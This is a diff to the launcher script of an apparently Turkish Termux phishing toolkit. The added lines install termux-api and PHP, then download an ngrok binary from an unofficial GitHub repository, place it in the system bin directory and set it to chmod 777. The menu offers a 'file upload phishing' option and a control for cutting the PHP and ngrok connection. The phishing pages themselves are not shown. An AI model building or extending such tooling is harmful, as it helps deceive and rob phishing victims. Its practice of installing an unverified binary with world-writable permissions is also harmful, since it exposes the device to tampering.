@@ -13,6 +13,63 @@ if [[ $kontrol == 0 ]];then
 		exit
 	fi
 fi
+#################### TERMUX-APİ ####################
+kontrol=$(which termux-notification |wc -l)
+if [[ $kontrol == 0 ]];then
+	echo
+	echo
+	echo
+	printf "\e[32m[*] \e[0mTERMUX-APİ PAKETİ YÜKLENİYOR "
+	echo
+	echo
+	echo
+	pkg install termux-api -y
+fi
+kontrol=$(timeout 5 termux-battery-status |wc -l)
+if [[ $kontrol == 0 ]];then
+	echo
+	echo
+	echo
+	printf "\e[31m[!]\e[97m TERMUX APİ UYGULAMASINI YÜKLEYİNİZ"
+	echo
+	echo
+	echo
+	sleep 2
+	am start -a android.intent.action.VIEW "https://play.google.com/store/apps/details?id=com.termux.api"
+	echo
+	echo
+	echo
+	exit
+fi
+#################### PHP ####################
+kontrol=$(which php |wc -l)
+if [[ $kontrol == 0 ]];then
+	echo
+	echo
+	echo
+	printf "\e[32m[*] \e[0mPHP PAKETİ YÜKLENİYOR "
+	echo
+	echo
+	echo
+	pkg install php -y
+fi
+
+#################### NGROK ####################
+kontrol=$(which ngrok |wc -l)
+if [[ $kontrol == 0 ]];then
+	echo
+	echo
+	echo
+	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
+	echo
+	echo
+	echo
+	git clone https://github.com/termuxxtoolss/ngrok
+	mv ngrok/ngrok /data/data/com.termux/files/usr/bin
+	chmod 777 /data/data/com.termux/files/usr/bin/ngrok
+	rm -rf ngrok
+fi
+
 cd files
 bash güncelleme.sh
 bash banner.sh
@@ -227,9 +284,9 @@ printf "
 
 \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mDOSYA YÜKLE PHİSHİNG\e[97m
 
-\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[34mRESİMLERİ DOSYALARA KOPYALA\e[97m
+\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[33mRESİMLERİ DOSYALARA KOPYALA\e[97m
 
-\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[34mPHP & NGROK BAĞLANTIYI KES\e[97m
+\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[33mPHP & NGROK BAĞLANTIYI KES\e[97m
 
 \e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
 "
